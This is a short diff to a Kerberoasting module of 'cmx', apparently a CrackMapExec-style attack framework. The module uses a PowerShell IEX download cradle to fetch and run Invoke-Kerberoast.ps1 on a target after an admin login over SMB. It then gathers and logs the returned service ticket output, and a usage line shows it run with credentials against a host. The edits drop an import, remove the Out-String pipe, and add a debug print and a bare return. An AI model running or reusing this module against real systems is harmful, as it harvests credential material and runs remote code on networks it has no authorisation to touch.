@@ -1,9 +1,8 @@
 from cmx.helpers.powershell import clean_ps_script, gen_ps_iex_cradle
-from cmx.helpers.misc import validate_ntlm
+
 from cmx.helpers.logger import write_log, highlight
 from datetime import datetime
 from cmx import config as cfg
-import re
 import pdb
 
 class CMXModule:
@@ -34,7 +33,7 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
         self.ps_script = clean_ps_script('powershell_scripts/Invoke-Kerberoast.ps1')
 
     def on_admin_login(self, context, connection):
-        command = "Invoke-Kerberoast | Out-String"
+        command = "Invoke-Kerberoast"
 
         launcher = gen_ps_iex_cradle(context, 'Invoke-Kerberoast.ps1', command, server_os=connection.server_os)
 
@@ -60,7 +59,7 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
 
         # We've received the response, stop tracking this host
         response.stop_tracking_host()
-
+        print(data)
         if len(data):
             lines = data.decode().split("             ")
             for line in lines:
@@ -68,3 +67,4 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
                 context.log.highlight(line)
         else:
             context.log.info("No Results ¯\\_('_')_/¯")
+        return
